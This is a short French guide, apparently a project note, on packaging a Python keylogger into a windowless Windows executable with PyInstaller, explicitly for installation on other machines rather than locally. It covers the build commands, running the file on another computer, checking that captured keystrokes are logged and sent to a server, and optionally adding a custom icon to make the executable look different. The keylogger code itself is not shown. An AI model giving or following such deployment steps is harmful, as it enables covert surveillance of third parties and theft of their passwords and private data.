Étapes pour créer un fichier keylogger.exe a installer sur d'autres machines (pas en local) autres :

Prérequis

Python 3.x installé sur votre machine.
Le package pyinstaller (utilisé pour convertir les scripts Python en fichiers exécutables).
Accès au terminal ou à l'invite de commande.

1. Installer PyInstaller
pip install pyinstaller

2.  Générer l'exécutable
pyinstaller --onefile --noconsole keylogger.py

3. Localisation de l'exécutable
Après l'exécution de la commande, un dossier dist/ sera créé dans le répertoire actuel.
L'exécutable final se trouve dans ce dossier et sera nommé keylogger.exe (ou similaire).

4. Tester l'exécutable
Copiez le fichier .exe sur une autre machine.
Exécutez-le en double-cliquant sur l'icône pour démarrer le keylogger.
Assurez-vous que le fichier key_log.txt est créé dans le même répertoire que l'exécutable, et que les données sont envoyées correctement au serveur.

5. (Facultatif) Personnalisation de l'exécutable
Si vous souhaitez ajouter une icône personnalisée ou améliorer l'apparence de votre fichier .exe :

Préparez un fichier d'icône .ico.
Modifiez la commande PyInstaller comme suit :
pyinstaller --onefile --noconsole --icon=custom_icon.ico keylogger.py


